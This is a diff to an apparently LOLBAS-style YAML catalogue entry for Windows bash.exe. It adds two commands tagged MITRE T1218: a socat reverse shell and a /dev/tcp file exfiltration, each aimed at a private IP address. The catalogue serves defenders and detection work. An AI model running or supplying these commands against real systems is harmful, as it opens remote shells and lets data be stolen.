@@ -12,6 +12,22 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 10
+  - Command: bash.exe -c "socat tcp-connect:192.168.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+    Description: Executes a reverseshell
+    Usecase: Performs execution of specified file, can be used as a defensive evasion.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows 10
+  - Command: bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
+    Description: Exfiltrate data
+    Usecase: Performs execution of specified file, can be used as a defensive evasion.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows 10
   - Command: bash.exe -c calc.exe
     Description: Executes calc.exe from bash.exe
     Usecase: Performs execution of specified file, can be used to bypass Application Whitelisting.
@@ -32,4 +48,6 @@ Resources:
 Acknowledgement:
   - Person: Alex Ionescu
     Handle: '@aionescu'
+  - Person: Asif Matadar
+    Handle: '@d1r4c'
 ---
